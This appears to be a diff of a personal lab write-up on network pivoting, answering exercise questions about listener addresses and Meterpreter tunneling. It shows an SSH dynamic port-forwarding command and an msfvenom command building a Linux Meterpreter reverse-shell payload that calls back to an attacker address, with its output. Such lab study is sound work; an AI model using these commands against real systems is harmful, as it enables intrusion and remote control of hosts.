@@ -130,7 +130,31 @@ The output revealed three interfaces, one of which was ens224, assigned the IP a
 
 * **What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**
 
-  When setting up a listener (e.g., for a reverse shell, Meterpreter handler, or any other network service), `0.0.0.0` ensures that the service listens on all available network interfaces rather than a specific one.
+When setting up a listener (e.g., for a reverse shell, Meterpreter handler, or any other network service), `0.0.0.0` ensures that the service listens on all available network interfaces rather than a specific one.
+
+
+## Meterpreter Tunneling & Port Forwarding
+
+* **What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**
+
+I connected to the SSH server using dynamic port forwarding with the following command:
+
+```bash
+ssh -D 9050 ubuntu@10.129.135.184
+```
+Next, I generated a Meterpreter payload for the Ubuntu server using msfvenom:
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.162 LPORT=8080 -f elf -o shell
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: shell
+
+```
 
 
 
